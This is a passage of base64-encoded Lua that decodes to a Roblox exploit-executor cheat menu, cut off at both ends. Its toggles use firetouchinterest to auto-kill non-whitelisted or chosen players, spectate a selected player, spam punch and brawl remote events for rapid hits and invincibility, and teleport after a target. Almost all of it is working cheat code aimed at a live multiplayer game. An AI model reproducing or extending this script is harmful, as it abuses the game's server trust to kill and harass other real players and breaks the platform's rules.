eWVyIE5hbWUiLAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRleHQpCiAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgcGxheWVyV2hpdGVsaXN0W3RhcmdldC5OYW1lXSA9IHRydWUKICAgICAgICBlbmQKICAgIGVuZAp9KQoKS2lsbHNUYWI6VGV4dGJveCh7CiAgICBUaXRsZSA9ICJVbldoaXRlbGlzdCBQbGF5ZXIiLAogICAgRGVzYyA9ICJSZW1vdmUgcGxheWVyIGZyb20gd2hpdGVsaXN0IiwKICAgIFBsYWNlaG9sZGVyID0gIlBsYXllciBOYW1lIiwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZCh0ZXh0KQogICAgICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFt0YXJnZXQuTmFtZV0gPSBuaWwKICAgICAgICBlbmQKICAgIGVuZAp9KQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gV2hpdGVsaXN0IEZyaWVuZHMiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IHdoaXRlbGlzdCBmcmllbmRzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGZyaWVuZFdoaXRlbGlzdEFjdGl2ZSA9IHN0YXRlCgogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgYW5kIExvY2FsUGxheWVyOklzRnJpZW5kc1dpdGgocGxheWVyLlVzZXJJZCkgdGhlbgogICAgICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtwbGF5ZXIuTmFtZV0gPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgICAgICAgICAgICAgaWYgZnJpZW5kV2hpdGVsaXN0QWN0aXZlIGFuZCBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgYW5kIExvY2FsUGxheWVyOklzRnJpZW5kc1dpdGgocGxheWVyLlVzZXJJZCkgdGhlbgogICAgICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtwbGF5ZXIuTmFtZV0gPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVsc2UKICAgICAgICAgICAgZm9yIG5hbWUgaW4gcGFpcnMocGxheWVyV2hpdGVsaXN0KSBkbwogICAgICAgICAgICAgICAgbG9jYWwgZnJpZW5kID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChuYW1lKQogICAgICAgICAgICAgICAgaWYgZnJpZW5kIGFuZCBMb2NhbFBsYXllcjpJc0ZyaWVuZHNXaXRoKGZyaWVuZC5Vc2VySWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbbmFtZV0gPSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBLaWxsIFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBLaWxsIn0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBLaWxsIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBraWxsIGFsbCBub24td2hpdGVsaXN0ZWQgcGxheWVycyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvS2lsbCA9IHN0YXRlCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBhdXRvS2lsbCBkbwogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgICAgICAgICAgbG9jYWwgcmlnaHRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKQogICAgICAgICAgICAgICAgbG9jYWwgbGVmdEhhbmQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikKCiAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICBpZiBwdW5jaCBhbmQgbm90IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiByaWdodEhhbmQgYW5kIGxlZnRIYW5kIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdGFyZ2V0IGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0IH49IExvY2FsUGxheWVyIGFuZCBub3QgcGxheWVyV2hpdGVsaXN0W3RhcmdldC5OYW1lXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRDaGFyID0gdGFyZ2V0LkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSB0YXJnZXRDaGFyIGFuZCB0YXJnZXRDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIFRhcmdldCBLaWxsIFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiVGFyZ2V0IEtpbGwifSkKCmxvY2FsIHRhcmdldERyb3Bkb3duID0gS2lsbHNUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IFRhcmdldCIsCiAgICBMaXN0ID0ge30sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihuYW1lKQogICAgICAgIGlmIG5hbWUgYW5kIG5vdCB0YWJsZS5maW5kKHRhcmdldFBsYXllck5hbWVzLCBuYW1lKSB0aGVuCiAgICAgICAgICAgIHRhYmxlLmluc2VydCh0YXJnZXRQbGF5ZXJOYW1lcywgbmFtZSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gUG9wdWxhdGUgdGFyZ2V0IGRyb3Bkb3duCmZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICB0YXJnZXREcm9wZG93bjpBZGQocGxheWVyLk5hbWUpCiAgICAgICAgdGFyZ2V0RHJvcGRvd25JdGVtc1twbGF5ZXIuTmFtZV0gPSB0cnVlCiAgICBlbmQKZW5kCgpQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICB0YXJnZXREcm9wZG93bjpBZGQocGxheWVyLk5hbWUpCiAgICAgICAgdGFyZ2V0RHJvcGRvd25JdGVtc1twbGF5ZXIuTmFtZV0gPSB0cnVlCiAgICBlbmQKZW5kKQoKUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdIHRoZW4KICAgICAgICB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSA9IG5pbAogICAgICAgIHRhcmdldERyb3Bkb3duOkNsZWFyKCkKICAgICAgICBmb3IgbmFtZSBpbiBwYWlycyh0YXJnZXREcm9wZG93bkl0ZW1zKSBkbwogICAgICAgICAgICB0YXJnZXREcm9wZG93bjpBZGQobmFtZSkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGZvciBpID0gI3RhcmdldFBsYXllck5hbWVzLCAxLCAtMSBkbwogICAgICAgIGlmIHRhcmdldFBsYXllck5hbWVzW2ldID09IHBsYXllci5OYW1lIHRoZW4KICAgICAgICAgICAgdGFibGUucmVtb3ZlKHRhcmdldFBsYXllck5hbWVzLCBpKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCktpbGxzVGFiOlRleHRib3goewogICAgVGl0bGUgPSAiUmVtb3ZlIFRhcmdldCIsCiAgICBEZXNjID0gIlJlbW92ZSBwbGF5ZXIgZnJvbSB0YXJnZXQgbGlzdCIsCiAgICBQbGFjZWhvbGRlciA9ICJQbGF5ZXIgTmFtZSIsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihuYW1lKQogICAgICAgIGZvciBpLCB2IGluIGlwYWlycyh0YXJnZXRQbGF5ZXJOYW1lcykgZG8KICAgICAgICAgICAgaWYgdiA9PSBuYW1lIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLnJlbW92ZSh0YXJnZXRQbGF5ZXJOYW1lcywgaSkKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiU3RhcnQgS2lsbCBUYXJnZXQiLAogICAgRGVzYyA9ICJLaWxsIHNlbGVjdGVkIHRhcmdldHMgb25seSIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBraWxsVGFyZ2V0ID0gc3RhdGUKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGtpbGxUYXJnZXQgZG8KICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKCiAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICBpZiBwdW5jaCBhbmQgbm90IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCByaWdodEhhbmQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJSaWdodEhhbmQiLCA1KQogICAgICAgICAgICAgICAgbG9jYWwgbGVmdEhhbmQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJMZWZ0SGFuZCIsIDUpCgogICAgICAgICAgICAgICAgaWYgcmlnaHRIYW5kIGFuZCBsZWZ0SGFuZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG5hbWUgaW4gaXBhaXJzKHRhcmdldFBsYXllck5hbWVzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKG5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0IH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCn0pCgotLSBTcHkgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJTcHkifSkKCmxvY2FsIHNweVRhcmdldERyb3Bkb3duID0gS2lsbHNUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IFZpZXcgVGFyZ2V0IiwKICAgIExpc3QgPSB7fSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKG5hbWUpCiAgICAgICAgdGFyZ2V0UGxheWVyTmFtZSA9IG5hbWUKICAgIGVuZAp9KQoKZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNweVRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgIGVuZAplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNweVRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgIGVuZAplbmQpCgpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICBzcHlUYXJnZXREcm9wZG93bjpDbGVhcigpCiAgICAgICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHBsciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICBzcHlUYXJnZXREcm9wZG93bjpBZGQocGxyLk5hbWUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJWaWV3IFBsYXllciIsCiAgICBEZXNjID0gIlNwZWN0YXRlIHNlbGVjdGVkIHBsYXllciIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBzcHlpbmcgPSBzdGF0ZQogICAgICAgIGlmIG5vdCBzcHlpbmcgdGhlbgogICAgICAgICAgICBsb2NhbCBjYW0gPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIG9yIExvY2FsUGxheWVyCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBzcHlpbmcgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGFyZ2V0UGxheWVyTmFtZSkKICAgICAgICAgICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0IH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBodW1hbm9pZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIENvbWJhdCBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkNvbWJhdCJ9KQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gSGl0IE5vIEFuaW0iLAogICAgRGVzYyA9ICJSYXBpZCBwdW5jaCB3aXRob3V0IGFuaW1hdGlvbiIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBzdGF0ZQogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBhdXRvUHVuY2hOb0FuaW0gZG8KICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgIGlmIHB1bmNoIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaC5QYXJlbnQgfj0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIlF1aWNrIEhpdCIsCiAgICBEZXNjID0gIkZhc3QgcHVuY2ggd2l0aCBubyBkZWxheSIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfRy5hdXRvUHVuY2hBY3RpdmUgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBfRy5hdXRvUHVuY2hBY3RpdmUgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2g6RmluZEZpcnN0Q2hpbGQoImF0dGFja1RpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBfRy5hdXRvUHVuY2hBY3RpdmUgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwdW5jaDpBY3RpdmF0ZSgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZWxzZQogICAgICAgICAgICBsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgIGlmIHB1bmNoIHRoZW4KICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBHb2QgTW9kZSBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkdvZCBNb2RlIn0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiR29kIE1vZGUiLAogICAgRGVzYyA9ICJJbnZpbmNpYmlsaXR5IGluIGJyYXdscyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBnb2RNb2RlVG9nZ2xlID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgZ29kTW9kZVRvZ2dsZSBkbwogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmJyYXdsRXZlbnQ6RmlyZVNlcnZlcigiam9pbkJyYXdsIikKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKS2lsbHNUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkRhbWFnZSBXaXRoIEdvZG1vZGUiLAogICAgRGVzYyA9ICJEZWFsIGRhbWFnZSB3aGlsZSBpbiBnb2QgbW9kZSIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBnb2REYW1hZ2VBY3RpdmUgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBnb2REYW1hZ2VBY3RpdmUgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgICAgICAgICBsb2NhbCBncm91bmRTbGFtID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJHcm91bmQgU2xhbSIpIG9yIChwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJHcm91bmQgU2xhbSIpKQoKICAgICAgICAgICAgICAgICAgICBpZiBncm91bmRTbGFtIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ3JvdW5kU2xhbS5QYXJlbnQgPT0gcGxheWVyLkJhY2twYWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VuZFNsYW0uUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdyb3VuZFNsYW06RmluZEZpcnN0Q2hpbGQoImF0dGFja1RpbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBncm91bmRTbGFtLmF0dGFja1RpbWUuVmFsdWUgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInNsYW0iKQogICAgICAgICAgICAgICAgICAgICAgICBncm91bmRTbGFtOkFjdGl2YXRlKCkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkgCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBGb2xsb3cgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJGb2xsb3cifSkKCmxvY2FsIGZvbGxvd0Ryb3Bkb3duID0gS2lsbHNUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiRm9sbG93IFBsYXllciAoVFApIiwKICAgIExpc3QgPSB7fSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgICAgIGlmIHNlbGVjdGVkIGFuZCBzZWxlY3RlZCB+PSAiIiB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWQpCiAgICAgICAgICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgICAgICAgICBmb2xsb3dUYXJnZXQgPSB0YXJnZXQuTmFtZQogICAgICAgICAgICAgICAgZm9sbG93aW5nID0gdHJ1ZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAt